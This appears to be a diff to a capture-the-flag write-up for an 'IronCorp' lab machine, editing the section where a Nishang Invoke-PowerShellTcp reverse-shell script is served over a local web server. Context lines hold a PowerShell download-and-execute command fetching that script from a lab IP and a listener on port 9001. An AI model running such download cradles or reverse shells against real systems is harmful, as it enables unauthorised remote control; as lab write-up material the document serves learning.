@@ -624,7 +624,7 @@ A:active {
 <br>
 
 
-<h3>Download Incoke-PowerShellTcp.ps1</h3>
+<h3>Download Invoke-PowerShellTcp.ps1</h3>
 <p>
 
 - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>
@@ -641,6 +641,9 @@ powershell.exe -c iex(new-object net.webclient).downloadstring(‘http://10.201.
 <br>
 <br>
 
+
+<h3>Search: http://10.201.118.153:8000/Invoke-PowerShell.ps1</h3>
+
 :~/IronCorp# ls
 Invoke-PowerShellTcp.ps1
 root@ip-10-201-118-153:~/IronCorp# python3 -m http.server
@@ -654,7 +657,16 @@ Listening on 0.0.0.0 9001
 
 
 
-Search: http://internal.ironcorp.me:11025/?r=http://10.201.118.153:8000/Invoke-PowerShellTcp.ps1
+
+
+<img width="1137" height="562" alt="image" src="https://github.com/user-attachments/assets/40f38dfe-1558-4ed4-af01-a5fea68b255f" />
+
+<br>
+<br>
+
+<img width="1123" height="177" alt="image" src="https://github.com/user-attachments/assets/9bdb5649-1394-403b-8791-e441eed49867" />
+
+
 
 
 
